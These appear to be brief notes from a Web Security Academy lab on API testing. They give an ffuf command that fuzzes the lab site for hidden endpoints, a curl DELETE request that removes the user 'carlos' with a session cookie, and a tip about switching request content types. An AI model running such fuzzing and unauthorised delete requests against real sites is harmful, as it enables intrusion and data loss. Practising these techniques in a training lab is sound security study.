____

```bash
ffuf -w content.txt -u https://0a6d001d0357c03183baaa2600fe0023.web-security-academy.net/FUZZ
```

```bash
curl https://0a6d001d0357c03183baaa2600fe0023.web-security-academy.net/api/user/carlos -X DELETE -H  
'Cookie: session=wBQWoe4x6dke6hWYkh4WO0EQ9Hs2fXSY'
```

To change the content type, modify the `Content-Type` header, then reformat the request body accordingly. You can use the Content type converter BApp to automatically convert data submitted within requests between XML and JSON.